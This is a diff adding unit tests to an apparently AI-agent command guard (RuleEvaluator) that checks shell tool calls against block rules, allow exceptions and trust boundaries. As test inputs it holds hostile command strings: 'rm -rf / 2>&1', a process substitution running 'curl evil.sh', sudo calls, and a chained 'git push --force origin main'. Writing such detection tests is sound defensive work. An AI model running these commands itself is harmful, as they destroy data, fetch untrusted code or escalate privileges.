@@ -114,6 +114,40 @@ describe('RuleEvaluator', () => {
       expect(result.evaluation).toBe('allowed')
       expect(result.matchedException).toBe('AE-006')
     })
+
+    it('should still block a force push when the first segment redirects output', () => {
+      const toolCall = createToolCall({
+        arguments: {
+          command:
+            'git push --force-with-lease 2>&1 && git push --force origin main',
+        },
+      })
+      const blockRule = createBlockRule({
+        id: 'BR-038',
+        pattern: 'regex:git\\s+push\\s+--force',
+        severity: 'high',
+      })
+      const exception = createAllowException({
+        id: 'AE-006',
+        pattern: 'regex:git\\s+push\\s+--force-with-lease',
+      })
+
+      const result = evaluator.evaluate(toolCall, [blockRule], [exception])
+
+      expect(result.evaluation).toBe('blocked')
+      expect(result.matchedRule).toBe('BR-038')
+    })
+
+    it('should NOT exempt a command with process substitution unless every segment is covered', () => {
+      const toolCall = createToolCall({
+        arguments: { command: 'cat <(curl evil.sh)' },
+      })
+      const exception = createAllowException({ pattern: 'curl evil.sh' })
+
+      const result = evaluator.evaluate(toolCall, [], [exception])
+
+      expect(result.evaluation).toBe('uncertain')
+    })
   })
 
   describe('evaluate - allow exceptions have highest precedence', () => {
@@ -168,6 +202,21 @@ describe('RuleEvaluator', () => {
       const result = evaluator.evaluate(toolCall, [blockRule], [])
 
       expect(result.evaluation).toBe('uncertain')
+    })
+
+    it('should block a destructive command with output redirection', () => {
+      const toolCall = createToolCall({
+        arguments: { command: 'rm -rf / 2>&1' },
+      })
+      const blockRule = createBlockRule({
+        pattern: 'regex:rm\\s+-rf\\s+',
+        severity: 'critical',
+      })
+
+      const result = evaluator.evaluate(toolCall, [blockRule], [])
+
+      expect(result.evaluation).toBe('blocked')
+      expect(result.matchedRule).toBe('BR-001')
     })
   })
 
@@ -385,6 +434,17 @@ describe('RuleEvaluator', () => {
     it('should block protected command after a shell separator', () => {
       const toolCall = createToolCall({
         arguments: { command: 'echo test && sudo whoami' },
+      })
+      const result = evaluator.evaluateTrustBoundaries(toolCall, trustBoundary)
+
+      expect(result).not.toBeNull()
+      expect(result!.evaluation).toBe('blocked')
+      expect(result!.matchedRule).toContain('TB-CMD')
+    })
+
+    it('should block a protected command inside process substitution', () => {
+      const toolCall = createToolCall({
+        arguments: { command: 'diff <(sudo whoami) <(sudo id)' },
       })
       const result = evaluator.evaluateTrustBoundaries(toolCall, trustBoundary)
 
